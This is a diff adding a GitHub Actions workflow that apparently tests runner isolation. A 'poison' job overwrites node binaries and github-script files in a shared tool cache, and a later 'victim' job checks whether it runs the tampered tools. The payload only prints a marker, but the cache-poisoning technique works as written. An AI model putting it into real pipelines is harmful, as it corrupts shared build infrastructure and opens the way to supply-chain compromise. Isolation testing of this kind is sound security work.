@@ -1,0 +1,23 @@
+on: push
+jobs:
+  warm:
+    runs-on: eval-linux
+    steps:
+      - uses: actions/github-script@v7
+        with: {script: "console.log('warm')"}
+  poison:
+    needs: warm
+    runs-on: eval-linux-host
+    steps:
+      - shell: bash
+        run: |
+          work=$(dirname "$RUNNER_TOOL_CACHE")
+          for node in $(find "$work" -path '*/bin/node' -type f 2>/dev/null); do printf '#!/bin/sh\necho POISONED\n' > "$node"; done
+          for script in $(find "$work" -path '*github-script*' -name '*.js' 2>/dev/null); do echo 'console.log("POISONED")' > "$script"; done
+          echo poisoned what it found
+  victim:
+    needs: poison
+    runs-on: eval-linux
+    steps:
+      - uses: actions/github-script@v7
+        with: {script: "console.log('clean run')"}
